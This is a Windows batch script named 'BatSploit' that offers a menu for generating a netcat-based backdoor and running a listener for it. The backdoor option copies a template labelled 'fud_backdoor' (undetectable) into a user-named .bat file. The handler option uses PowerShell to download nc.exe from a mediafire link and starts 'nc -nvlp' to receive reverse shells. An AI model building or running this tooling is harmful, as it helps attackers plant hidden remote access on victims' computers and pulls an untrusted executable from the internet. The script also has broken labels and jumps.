@echo off
goto in
:in
mode 79,20
color b0
cls
echo.
echo                   XXXXXXXXXXXXXXXXXXXXXXXXX
echo                   Bem-vindo(a) ao BatSploit
echo                   XXXXXXXXXXXXXXXXXXXXXXXXX
echo                         coder : ProXy	
echo.
echo         [bd_bat] Backdoor using NetCat no instalation required
echo         [mt_handler] Handler to listen connection, instalation required NetCat
echo.
set /p opt=batSploit : 
if '%opt%'== 'bd_bat' goto bd
if '%opt%'== 'mt_handler' goto hd
goto e1
:e1
echo.
echo This option doesnt exists pls select other
ping localhost -n 3 > null
attrib +s +h null
goto in
:bd
set /p name=batSploit [1] FileName : 
echo.
echo Generating Backdoor Wait One Moment
echo.
cd exploits
msg * ALTERRE YOUR_IP E YOUR_PORT
start default_fud_backdoor.txt
pause
copy default_fud_backdoor.txt %name%.bat
move %name%.bat ../output/%name%.bat
copy test.txt default_fud_backdoor.txt
echo.
echo Backdoor was created
cd ..
ping localhost -n 5 > null
goto in
:hd
echo.
set /p per=Voce tem NetCat baixado [S/N] ? 
if '%per%'=='N' goto n
if '%per%'=='S' goto s
goto e2
e2:
echo.
echo This command doesnt exists
goto 2
:n
echo.
echo Downloading netcat ...
powershell (New-Object System.Net.WebClient).DownloadFile('http://download1979.mediafire.com/ytti8lezd61g/plfm7t2nar12hdb/nc.exe', 'nc.exe')
echo.
echo Downloading Completed
echo.
set /p port=batSploit [2] Port : 
echo Handller Started
start nc -nvlp %port%
:s
echo.
set /p port=batSploit [2] Port : 
echo Handller Started
start nc -nvlp %port%
